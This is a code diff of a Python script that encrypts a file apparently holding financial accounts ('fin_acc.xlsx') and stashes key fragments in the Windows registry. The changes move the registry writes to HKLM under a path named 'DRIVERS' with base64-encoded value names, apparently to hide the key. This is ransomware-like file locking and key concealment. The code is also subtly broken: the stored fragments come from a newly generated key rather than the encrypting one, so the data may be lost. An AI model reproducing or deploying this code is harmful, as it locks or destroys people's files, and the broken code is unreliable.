@@ -1,5 +1,7 @@
+from fileinput import filename
 from cryptography.fernet import Fernet
 import winreg
+import os
 import base64
 
 
@@ -8,36 +10,36 @@ class hideKey():
     def __init__(self, adj_key: list):
 
         self.adj_key = adj_key
-        self.REG_PATH = r'Conrol Panel\Keyboard'
+        self.REG_PATH = r'DRIVERS'
         self.run()
 
     @staticmethod
     def set_reg(name, value, REG_PATH):
         try:
 
-            winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
+            winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, REG_PATH)
 
             registry_key = winreg.OpenKey(
-                winreg.HKEY_CURRENT_USER,
+                winreg.HKEY_LOCAL_MACHINE,
                 REG_PATH,
                 0,
-                winreg.KEY_WRITE
+                winreg.KEY_WRITE,
                 )
-
-            winreg.SetValueEx(registry_key, name, 0, winreg.REG_SZ, value)
+            winreg.SetValueEx(registry_key, name.decode('ascii'), 0, winreg.REG_SZ, value.decode('ascii'))
             winreg.CloseKey(registry_key)
 
             print(f'Done! Registry written in {REG_PATH}')
-
+            return True
         except WindowsError as error:
             print(f"Can't set registry...\nError:{error}")
+            return False
 
     def run(self):
 
-        for num in range(5):
+        for num in range(4):
 
             hideKey.set_reg(
-                name=base64.b64encode(num),
+                name=base64.b64encode(str(num).encode()),
                 value=self.adj_key[num],
                 REG_PATH=self.REG_PATH,
             )
@@ -95,10 +97,12 @@ class keyGenerator():
 if __name__ == "__main__":
 
     encryptFile(
-        filename="fin_acc.xlsx",
+        filename=os.path.abspath("fin_acc.xlsx"),
         key=keyGenerator.gen_key()
     ).run()
 
     hideKey(
-        adj_key=keyGenerator.adj_key()
+        adj_key=keyGenerator.adj_key(
+            keyGenerator.gen_key()
+        )
     ).run()
